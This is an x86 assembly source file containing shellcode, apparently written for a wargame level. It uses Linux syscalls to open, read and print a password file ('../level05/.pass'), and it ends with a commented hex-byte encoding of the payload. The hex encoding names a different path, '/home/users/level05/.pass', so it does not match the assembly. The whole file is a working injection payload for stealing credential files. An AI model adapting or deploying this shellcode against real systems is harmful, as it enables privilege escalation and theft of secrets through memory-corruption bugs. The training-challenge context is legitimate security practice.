global shellcode

shellcode:
	xor	eax, eax
	xor	ebx, ebx
	xor	ecx, ecx
	xor	edx, edx
	jmp	two				; skip to end

one:
	pop		ebx			; get "../level05/.pass" into target file
	mov		al, 5		; set syscall to open
	int		0x80		; open .pass

	mov		ebx, eax	; set ebx to input fd
	mov		al, 3		; set syscall to read
	sub		esp, 40		; esp -= 40
	lea		ecx, [esp]	; set target buffer to stack
	mov		dl, 40		; set size to 40
	int		0x80		; read .pass

	mov		al, 4		; set syscall to write
	xor		ebx, ebx	;
	mov		bl, 1		; set ebx to output fd
	mov		dl, 40		; set size to 40 
	int		0x80		; write a
	
	xor		eax, eax
	mov		al, 1		; set syscall to exit
	xor		ebx, ebx	; set exit code to 0
	int		0x80		; exit

two:
	call	one		; use call to get code pointer
db "../level05/.pass",0

;"\x31\xc0"\
;"\x31\xdb"\
;"\x31\xc9"\
;"\x31\xd2"\
;"\xeb\x25"\
;"\x5b"\
;"\xb0\x05"\
;"\xcd\x80"\
;"\x89\xc3"\
;"\xb0\x03"\
;"\x83\xec\x28"\
;"\x8d\x0c\x24"\
;"\xb2\x28"\
;"\xcd\x80"\
;"\xb0\x04"\
;"\x31\xdb"\
;"\xb3\x01"\
;"\xb2\x28"\
;"\xcd\x80"\
;"\x31\xc0"\
;"\xb0\x01"\
;"\x31\xdb"\
;"\xcd\x80"\
;"\xe8\xd6\xff\xff\xff"\
;"/home/users/level05/.pass"